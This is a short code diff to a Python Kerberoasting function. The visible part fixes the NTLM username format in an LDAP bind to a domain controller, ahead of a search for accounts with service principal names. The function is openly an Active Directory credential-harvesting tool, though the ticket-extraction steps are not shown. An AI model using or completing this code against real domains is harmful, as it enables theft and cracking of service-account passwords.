@@ -4,7 +4,7 @@ def kerberoast(username, password, domain, dc_ip):
     try:
         # Connect to the domain controller via LDAP
         server = Server(dc_ip, use_ssl=False)
-        conn = Connection(server, user=f"{username}@{domain}", password=password, authentication='NTLM')
+        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication='NTLM')
         conn.bind()
 
         # Search for users with SPNs set
@@ -31,6 +31,7 @@ def kerberoast(username, password, domain, dc_ip):
 
     except Exception as e:
         print(f"Error while Kerberoasting: {e}")
+
 
 # Example usage:
 # Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
